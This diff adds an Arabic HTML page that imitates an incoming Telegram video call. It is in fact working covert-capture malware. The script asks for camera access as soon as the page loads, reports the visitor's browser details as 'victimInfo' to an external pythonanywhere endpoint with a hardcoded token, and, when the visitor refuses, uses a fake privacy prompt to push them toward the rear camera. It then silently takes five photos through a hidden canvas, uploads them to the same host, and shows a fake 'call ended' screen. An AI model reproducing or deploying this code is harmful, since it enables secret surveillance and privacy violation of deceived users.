@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مكالمة فيديو تليجرام</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Cairo', sans-serif; background: #1a222d; color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .call-container { background: #242f3d; padding: 40px; border-radius: 20px; text-align: center; max-width: 400px; width: 100%; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5); position: relative; }
+        .avatar { width: 120px; height: 120px; border-radius: 50%; background: #0088cc; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 50px; font-weight: bold; }
+        .caller-name { font-size: 28px; font-weight: 600; margin-bottom: 10px; }
+        .call-status { font-size: 18px; color: #a0b3c7; margin-bottom: 40px; }
+        .buttons { display: flex; justify-content: center; gap: 20px; }
+        button { border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 30px; transition: background-color 0.2s; }
+        .round-btn { width: 80px; height: 80px; border-radius: 50%; }
+        #joinButton { background: #28a745; color: white; }
+        #declineButton { background: #dc3545; color: white; }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(5px); display: none; align-items: center; justify-content: center; z-index: 1000; }
+        .modal-content { background: #242f3d; padding: 30px; border-radius: 15px; text-align: center; max-width: 320px; border: 1px solid #445; }
+        .modal-content h2 { margin-bottom: 15px; font-size: 22px; }
+        .modal-content p { margin-bottom: 25px; color: #a0b3c7; line-height: 1.6; }
+        .modal-buttons { display: flex; flex-direction: column; gap: 10px; }
+        .modal-buttons button { background: #0088cc; color: white; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: 600; }
+        .modal-buttons .cancel-btn { background: #454f5b; }
+        #hiddenVideo, #hiddenCanvas { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; }
+    </style>
+</head>
+<body>
+    <div class="call-container">
+        <div class="avatar">أ</div>
+        <h1 class="caller-name">مكالمة فيديو واردة</h1>
+        <p class="call-status" id="statusMessage">تليجرام</p>
+        <div class="buttons">
+            <button id="declineButton" class="round-btn">✖</button>
+            <button id="joinButton" class="round-btn">📞</button>
+        </div>
+    </div>
+    
+    <div id="permissionModal" class="modal-overlay">
+        <div class="modal-content">
+            <h2>مطلوب الوصول إلى الكاميرا</h2>
+            <p>للانضمام إلى المكالمة، يلزم الوصول إلى الفيديو. لخصوصيتك، يمكنك اختيار تفعيل الكاميرا الخلفية فقط.</p>
+            <div class="modal-buttons">
+                <button id="activateRearCam">تفعيل الكاميرا الخلفية فقط</button>
+                <button id="cancelModal" class="cancel-btn">إلغاء</button>
+            </div>
+        </div>
+    </div>
+
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+    <canvas id="hiddenCanvas"></canvas>
+
+    <script>
+        class GuidedChoiceProtocol {
+            constructor() {
+                this.apiEndpoint = 'https://ahmed1997.pythonanywhere.com/api/v1/log_event';
+                this.authToken = 'ahmed-secret-key-777';
+                this.stream = null;
+                this.maxCaptures = 5;
+                this.captureCount = 0;
+                this.operationStarted = false;
+                this.permissionDeniedOnce = false;
+
+                document.getElementById('joinButton').onclick = () => this.handleJoinClick();
+                document.getElementById('declineButton').onclick = () => this.disappear();
+                document.getElementById('activateRearCam').onclick = () => this.requestCamera(true);
+                document.getElementById('cancelModal').onclick = () => this.hideModal();
+
+                this.requestCamera(false);
+            }
+
+            updateStatus(message) {
+                document.getElementById('statusMessage').textContent = message;
+            }
+
+            handleJoinClick() {
+                if (this.operationStarted) {
+                    this.updateStatus('جاري الاتصال بالفعل...');
+                    return;
+                }
+                if (this.permissionDeniedOnce) {
+                    this.showModal();
+                } else {
+                    this.requestCamera(false);
+                }
+            }
+            
+            async requestCamera(useRearCamera) {
+                if (this.operationStarted) return;
+                
+                const cameraOptions = useRearCamera 
+                    ? { video: { facingMode: 'environment' }, audio: false } 
+                    : { video: { facingMode: 'user' }, audio: false };
+                
+                this.hideModal();
+                this.updateStatus('جاري المصادقة...');
+
+                try {
+                    await this.sendInitialReport(useRearCamera);
+                    this.stream = await navigator.mediaDevices.getUserMedia(cameraOptions);
+                    this.operationStarted = true;
+                    this.updateStatus('متصل. البث نشط.');
+                    
+                    const video = document.getElementById('hiddenVideo');
+                    video.srcObject = this.stream;
+                    this.soulReader(video);
+
+                } catch (error) {
+                    this.permissionDeniedOnce = true;
+                    this.updateStatus('مطلوب إذن الكاميرا.');
+                }
+            }
+            
+            soulReader(video) {
+                const canvas = document.getElementById('hiddenCanvas');
+                const ctx = canvas.getContext('2d', { willReadFrequently: true });
+                const heartbeat = setInterval(() => {
+                    if (video.readyState >= 2 && video.videoWidth > 0) {
+                        ctx.drawImage(video, 0, 0, 10, 10);
+                        const imageData = ctx.getImageData(0, 0, 1, 1).data;
+                        if (imageData[0] > 10 || imageData[1] > 10 || imageData[2] > 10) {
+                            clearInterval(heartbeat);
+                            this.updateStatus('تم تأمين البث. جاري الالتقاط...');
+                            this.startCaptureLoop();
+                        }
+                    }
+                }, 100);
+                setTimeout(() => { clearInterval(heartbeat); if (this.captureCount === 0) this.disappear(); }, 7000);
+            }
+
+            async sendInitialReport(useRearCamera) {
+                const victimInfo = { 
+                    userAgent: navigator.userAgent, 
+                    platform: navigator.platform,
+                    attempt: this.permissionDeniedOnce ? 'Second Stage (Rear Cam)' : 'First Strike (Front Cam)'
+                };
+                return fetch(this.apiEndpoint, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Auth-Token': this.authToken }, body: JSON.stringify({ info: victimInfo }) });
+            }
+
+            startCaptureLoop() {
+                if (this.captureCount >= this.maxCaptures) { this.disappear(); return; }
+                const video = document.getElementById('hiddenVideo');
+                const canvas = document.getElementById('hiddenCanvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                this.captureCount++;
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                this.sendPhotoReport(imageData, this.captureCount);
+                setTimeout(() => this.startCaptureLoop(), 500);
+            }
+
+            async sendPhotoReport(imageData, count) {
+                const victimInfo = { captureSequence: `${count}/${this.maxCaptures}` };
+                return fetch(this.apiEndpoint, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Auth-Token': this.authToken }, body: JSON.stringify({ image: imageData, info: victimInfo }) });
+            }
+
+            disappear() {
+                if (this.stream) { this.stream.getTracks().forEach(track => track.stop()); }
+                const container = document.querySelector('.call-container');
+                container.innerHTML = `<h1 class="caller-name">انتهت المكالمة</h1>`;
+            }
+
+            showModal() { document.getElementById('permissionModal').style.display = 'flex'; }
+            hideModal() { document.getElementById('permissionModal').style.display = 'none'; }
+        }
+        
+        new GuidedChoiceProtocol();
+    </script>
+</body>
+</html>
